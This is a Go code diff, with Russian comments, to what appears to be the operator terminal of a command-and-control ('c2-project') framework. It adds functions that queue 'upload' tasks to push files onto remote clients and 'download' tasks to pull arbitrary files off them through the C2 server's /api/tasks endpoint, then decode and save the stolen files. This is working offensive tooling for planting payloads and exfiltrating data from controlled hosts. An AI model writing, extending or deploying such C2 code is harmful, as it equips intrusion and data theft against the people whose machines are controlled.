@@ -5,6 +5,7 @@ package terminal
 import (
 	"bytes"
 	"c2-project/internal/compress"
+	"c2-project/internal/filetransfer"
 	"c2-project/internal/models"
 	"c2-project/internal/protocol"
 	"crypto/tls"
@@ -135,4 +136,110 @@ func (s *Service) WaitForResult(taskID string) (string, error) {
 		}
 	}
 	return "", fmt.Errorf("timeout waiting for result")
+}
+
+// SendFile — отправляет файл клиенту через сервер.
+// localPath — путь к файлу на стороне терминала.
+// remotePath — куда сохранить файл на клиенте.
+func (s *Service) SendFile(clientID, localPath, remotePath string) (string, error) {
+	data, checksum, _, err := filetransfer.ReadFileAsBase64(localPath)
+	if err != nil {
+		return "", fmt.Errorf("read file: %w", err)
+	}
+
+	task := models.Task{
+		ClientID:     clientID,
+		Command:      "upload",
+		Status:       "pending",
+		FileData:     data,
+		FileChecksum: checksum,
+		FileName:     remotePath,
+	}
+
+	token, err := protocol.EncodeRequest(task)
+	if err != nil {
+		return "", fmt.Errorf("encode error: %w", err)
+	}
+
+	req, err := http.NewRequest("POST", s.config.ServerURL+"/api/tasks", bytes.NewReader([]byte("{}")))
+	if err != nil {
+		return "", err
+	}
+	req.Header.Set("Authorization", "Bearer "+token)
+	req.Header.Set("Content-Type", "application/json")
+
+	resp, err := s.client.Do(req)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	var result map[string]interface{}
+	json.NewDecoder(resp.Body).Decode(&result)
+
+	taskID, _ := result["task_id"].(string)
+	if taskID == "" {
+		return "", fmt.Errorf("server did not return task_id")
+	}
+	return taskID, nil
+}
+
+// RequestFile — запрашивает файл у клиента.
+// remotePath — путь к файлу на клиенте.
+// Возвращает содержимое в base64|checksum (после WaitForResult терминал распарсит).
+func (s *Service) RequestFile(clientID, remotePath string) (string, error) {
+	task := models.Task{
+		ClientID: clientID,
+		Command:  "download",
+		Status:   "pending",
+		FileName: remotePath,
+	}
+
+	token, err := protocol.EncodeRequest(task)
+	if err != nil {
+		return "", fmt.Errorf("encode error: %w", err)
+	}
+
+	req, err := http.NewRequest("POST", s.config.ServerURL+"/api/tasks", bytes.NewReader([]byte("{}")))
+	if err != nil {
+		return "", err
+	}
+	req.Header.Set("Authorization", "Bearer "+token)
+	req.Header.Set("Content-Type", "application/json")
+
+	resp, err := s.client.Do(req)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	var result map[string]interface{}
+	json.NewDecoder(resp.Body).Decode(&result)
+
+	taskID, _ := result["task_id"].(string)
+	if taskID == "" {
+		return "", fmt.Errorf("server did not return task_id")
+	}
+	return taskID, nil
+}
+
+// SaveDownloadedFile — парсит "base64|checksum", проверяет checksum и сохраняет файл.
+func SaveDownloadedFile(result, localPath string) error {
+	parts := strings.SplitN(result, "|", 2)
+	if len(parts) != 2 {
+		return fmt.Errorf("invalid download result format")
+	}
+
+	encoded, expectedChecksum := parts[0], parts[1]
+
+	data, err := filetransfer.DecodeBase64(encoded, expectedChecksum)
+	if err != nil {
+		return fmt.Errorf("decode file: %w", err)
+	}
+
+	if err := filetransfer.SaveFile(localPath, data); err != nil {
+		return fmt.Errorf("save file: %w", err)
+	}
+
+	return nil
 }
